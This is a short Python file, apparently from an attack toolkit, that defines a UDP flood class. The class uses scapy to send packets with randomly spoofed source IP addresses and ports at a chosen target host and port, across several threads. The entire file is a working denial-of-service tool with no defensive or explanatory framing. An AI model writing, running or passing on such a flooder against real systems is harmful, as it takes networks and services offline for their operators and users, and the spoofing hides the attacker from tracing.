import random
from scapy.all import *
from threading import Thread
import sys , os
sys.path.append(os.path.join("Manage/Scripts/RESOLVE/"))
from DomainResolve import Resolve


def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

class UDPFlood():
    def __init__(self,dst,port,count):

        self.dst    = dst
        self.port   = port
        self.count  = count

    def ThreadStart(self):
        for i in range(10):
            t = Thread(target = self.Start)
            t.start()

            t.join()
    def Start(self):
        for i in range(int(self.count) / 10):
            self.Attack()

    def Attack(self):
        src_ip = SpoofIP()
        src_port = SpoofPort()
        network_layer = IP(src=src_ip, dst=self.dst)
        transport_layer = UDP(sport=int(src_port), dport=int(self.port))
        send(network_layer / transport_layer, verbose=False)

